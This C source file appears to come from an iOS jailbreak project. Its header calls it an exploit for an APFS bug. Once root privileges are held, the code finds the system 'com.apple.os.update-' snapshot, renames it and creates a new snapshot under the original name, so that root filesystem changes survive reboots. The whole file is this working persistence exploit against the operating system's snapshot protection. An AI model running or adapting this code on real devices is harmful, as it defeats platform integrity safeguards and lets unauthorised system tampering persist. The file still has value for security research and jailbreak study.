//
//  RemountFunc.c
//  empty_list
//
//  Created by Lakr Sakura on 2018/6/15.
//  Copyright © 2018 Ian Beer. All rights reserved.
//

#include "RemountFunc.h"


// An exploit written for an apfs bug found by @umanghere, by @Pwn20wnd
// Make your changes to the rootfs (Requires an additional exploit), spawn this
// with root privs and your changes will become persistent across reboots
// Thanks to snapUtil by Adam Leventhal (@ahl) for the do_* methods
// Thanks to Electra by CoolStar (@coolstarorg) for the check_snapshot method
// Copyright (c) 2018 Pwn20wnd
// Copyright (c) 2018 ur0

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <errno.h>
#include <sys/attr.h>
#include <sys/snapshot.h>

int do_create(int dirfd, const char *vol, const char *snap) {
    int ret = fs_snapshot_create(dirfd, snap, 0);
    if (ret != 0)
        perror("fs_snapshot_create");
    return ret;
}

int do_rename(int dirfd, const char *vol, const char *snap, const char *nw) {
    
    int ret = fs_snapshot_rename(dirfd, snap, nw, 0);
    if (ret != 0)
        perror("fs_snapshot_rename");
    return ret;
}

int check_snapshot(int dirfd, const char *vol, const char *snap) {
    struct attrlist alist = {0};
    char abuf[2048];
    
    alist.commonattr = ATTR_BULK_REQUIRED;
    
    int count = fs_snapshot_list(dirfd, &alist, &abuf[0], sizeof(abuf), 0);
    if (count < 0) {
        perror("fs_snapshot_list");
        return -1;
    }
    
    char *p = &abuf[0];
    for (int i = 0; i < count; i++) {
        char *field = p;
        uint32_t len = *(uint32_t *)field;
        field += sizeof(uint32_t);
        attribute_set_t attrs = *(attribute_set_t *)field;
        field += sizeof(attribute_set_t);
        
        if (attrs.commonattr & ATTR_CMN_NAME) {
            attrreference_t ar = *(attrreference_t *)field;
            const char *name = field + ar.attr_dataoffset;
            field += sizeof(attrreference_t);
            
            if (strcmp(name, snap) == 0) {
                return 1;
            }
        }
        
        p += len;
    }
    
    return 0;
}

char *find_system_snapshot(int dirfd) {
    struct attrlist alist = {0};
    char abuf[2048];
    
    alist.commonattr = ATTR_BULK_REQUIRED;
    
    int count = fs_snapshot_list(dirfd, &alist, &abuf[0], sizeof(abuf), 0);
    if (count < 0) {
        perror("fs_snapshot_list");
        return NULL;
    }
    
    char *p = &abuf[0];
    for (int i = 0; i < count; i++) {
        char *field = p;
        uint32_t len = *(uint32_t *)field;
        field += sizeof(uint32_t);
        attribute_set_t attrs = *(attribute_set_t *)field;
        field += sizeof(attribute_set_t);
        
        if (attrs.commonattr & ATTR_CMN_NAME) {
            attrreference_t ar = *(attrreference_t *)field;
            const char *name = field + ar.attr_dataoffset;
            field += sizeof(attrreference_t);
            
            if (strstr(name, "com.apple.os.update-")) {
                return strdup(name);
            }
        }
        
        p += len;
    }
    return NULL;
}

int RemountMain() {
    int dirfd = open("/", O_RDONLY, 0);
    if (dirfd < 0) {
        perror("open");
        return -1;
    }
    
    if (check_snapshot(dirfd, "/", "original_system_snapshot")) {
        return -2;
    }
    
    char *system_snapshot = find_system_snapshot(dirfd);
    
    printf("%s\n", system_snapshot);
    
    int ret = do_rename(dirfd, "/", system_snapshot, "original_system_snapshot");
    
    if (ret) {
        return -3;
    }
    
    ret = do_create(dirfd, "/", system_snapshot);
    free(system_snapshot);
    
    if (ret) {
        return -4;
    }
    
    return 0;
}
